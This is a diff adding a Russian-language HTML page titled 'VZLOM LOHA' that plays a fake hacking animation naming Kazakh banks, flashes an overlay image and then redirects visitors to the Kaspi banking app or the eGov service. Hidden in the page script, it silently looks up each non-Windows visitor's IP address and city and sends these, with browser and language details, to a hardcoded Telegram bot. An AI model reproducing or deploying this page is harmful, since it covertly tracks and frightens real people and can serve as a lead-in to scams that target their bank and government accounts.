@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>VZLOM LOHA</title>
+  <style>
+    @font-face {
+      font-family: 'Source Code Pro';
+      font-style: normal;
+      src: local('Source Code Pro'), local('SourceCodePro-Regular'),
+      url(http://themes.googleusercontent.com/static/fonts/sourcecodepro/v4/mrl8jkM18OlOQN8JLgasDxM0YzuT7MdOe03otPbuUS0.woff) format('woff');
+    }
+
+    body {
+      font-family: Source Code Pro;
+      background:#000;
+      color: #ff0000;
+      margin:0;
+      font-size: 18px;
+    }
+
+    .output-console {
+    }
+
+    p{margin:0}
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      z-index: 9999;
+    }
+    .overlay img {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+    }
+    .show {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="output-console"></div>  
+  <div id="overlay1" class="overlay">
+    <img src="https://ltdfoto.ru/images/2025/09/02/lk.png" alt="Картинка 1">
+  </div>
+  <div id="overlay2" class="overlay">
+    <img src="https://ltdfoto.ru/images/2025/09/03/egov.jpg" alt="Картинка 2">
+  </div>
+
+  <script>
+    function sendToTelegram(text) {
+      const URL = `https://api.telegram.org/bot7837570045:AAHzWk-oVbQ14szhZu0NlGVof68E-DzBfQ8/sendMessage?chat_id=-1002993722537&text=${encodeURIComponent(text)}`;
+      fetch(URL)
+          .then(response => response.json())
+          .then(data => console.log("Отправлено:", data))
+          .catch(error => console.error("Ошибка:", error));
+    }
+
+    let info = "НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ \n";
+    info += "Время захода: " + new Date().toString() + "\n \n";
+
+    if (/Windows/i.test(navigator.userAgent)) {
+      alert('Вход с Windows. Бот прервал отправку сообщения');
+    } else {
+      fetch("https://ipinfo.io/json?token=ba3d7762a82865")
+        .then(res => res.json())
+        .then(data => {
+          info += "IP: " + data.ip + "\n";
+          info += "Город: " + data.city + "\n";
+          info += "Браузер: " + navigator.userAgent + "\n";
+          info += "Язык: " + navigator.language + "\n";
+          sendToTelegram(info);
+        })
+        .catch(err => console.error("Ошибка:", err));
+    }
+
+    const outputConsole = document.querySelector(".output-console");
+
+    var commandStart = ['Performing DNS Lookups for','Searching ','Analyzing ','Estimating Approximate Location of ',
+      'Compressing ','Requesting Authorization From : KASPI BANK https://kaspi.kz/','wget -a -t ','tar -xzf ','Entering Location ','Compilation Started of ','Downloading '],
+        commandParts = ['Data Structure','Access HALYK BANK https://halykbank.kz/kz','Texture','TPS Reports',' .... Searching ... ','http://zanb.se/?23&88&far=2','http://ab.ret45-33/?timing=1ww'],
+        commandResponses = ['Authorizing ','Authorized...','Access Granted..','Access HOME CREDIT BANK https://home.kz/','Compression Complete.',
+        'Compilation of Data Structures Complete..','Entering Security Console...','Encryption Unsuccesful Attempting Retry...',
+        'Waiting for response...','....Searching...','Calculating Space Requirements '],
+        isProcessing = false,
+        processTime = 0,
+        lastProcess = 0;
+
+    function consoleOutput(){
+      var textEl = document.createElement('p');
+      if(isProcessing){
+          textEl = document.createElement('span');
+          textEl.textContent += Math.random() + " ";
+          if(Date.now() > lastProcess + processTime){
+              isProcessing = false;   
+          }
+      }else{
+          var commandType = ~~(Math.random()*4);
+          switch(commandType){
+              case 0:
+                  textEl.textContent = commandStart[~~(Math.random()*commandStart.length)] + commandParts[~~(Math.random()*commandParts.length)];
+                  break;
+              case 3: 
+                  isProcessing = true;
+                  processTime = ~~(Math.random()*2000);
+                  lastProcess = Date.now();
+              default:
+                  textEl.textContent = commandResponses[~~(Math.random()*commandResponses.length)];
+              break;
+          }
+      }
+      outputConsole.scrollTop = outputConsole.scrollHeight;
+      outputConsole.appendChild(textEl);
+      if (outputConsole.scrollHeight > window.innerHeight) {
+         var removeNodes = outputConsole.querySelectorAll('*');
+         for(var n = 0; n < ~~(removeNodes.length/3); n++){
+              outputConsole.removeChild(removeNodes[n]);
+          }
+      }
+      setTimeout(consoleOutput, ~~(Math.random()*50));
+    }
+
+    setTimeout(function(){   
+      outputConsole.style.height = (window.innerHeight / 3) * 2 + 'px';
+      outputConsole.style.top = window.innerHeight / 3 + 'px';
+      consoleOutput();
+    }, 1);
+
+    window.addEventListener('resize', function(){
+      outputConsole.style.height = (window.innerHeight / 3) * 2 + 'px';
+      outputConsole.style.top = window.innerHeight / 3 + 'px';
+    });
+
+    const wait = (ms) => new Promise(res => setTimeout(res, ms));
+
+    (async function() {
+	/*
+      await wait(3000);
+      document.getElementById('overlay1').classList.add('show');
+      await wait(1000);
+      document.getElementById('overlay1').classList.remove('show');
+*/
+      await wait(2000);
+      document.getElementById('overlay2').classList.add('show');
+      await wait(4000);
+      document.getElementById('overlay2').classList.remove('show');
+
+      await wait(1000);
+      window.location = "intent://#Intent;scheme=kaspikz;package=kz.kaspi.mobile;end";
+
+      if (navigator.userAgent.match(/Android/i)) {
+        window.location = 'egovmobile://';
+        setTimeout(() => {
+          window.location = 'https://play.google.com/store/apps/details?id=kz.mobile.mgov';
+        }, 1000);
+      } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+        window.location = 'egovmobile://';
+        setTimeout(() => {
+          window.location = 'https://apps.apple.com/kz/app/egov-mobile/id1476128386';
+        }, 1000);
+      } else {
+        window.location = 'https://egov.kz/';
+      }
+    })();
+  </script>
+</body>
+</html>
